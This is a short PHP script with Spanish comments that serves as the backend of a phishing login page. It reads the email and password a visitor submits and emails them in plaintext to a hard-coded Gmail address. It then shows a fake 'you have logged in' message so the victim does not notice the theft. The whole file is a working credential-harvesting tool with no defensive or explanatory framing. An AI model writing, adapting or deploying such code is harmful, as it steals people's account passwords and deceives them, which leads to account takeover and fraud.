<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $correo = $_POST['correo'];
    $clave = $_POST['clave'];

    // Dirección donde quieres recibir los datos
    $destino = "CMRRENGIFO23@GMAIL.COM";

    // Asunto del correo
    $asunto = "Nuevo intento de inicio de sesión";

    // Contenido del mensaje
    $mensaje = "Se han recibido los siguientes datos:\n\n";
    $mensaje .= "Correo: $correo\n";
    $mensaje .= "Contraseña: $clave\n";

    // Encabezados del correo
    $headers = "From: no-reply@tuweb.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviar correo
    if (mail($destino, $asunto, $mensaje, $headers)) {
        echo "<h2>Gracias. Has iniciado sesión.</h2>";
    } else {
        echo "<h2>Error al enviar el correo.</h2>";
    }
} else {
    echo "Acceso denegado.";
}
?>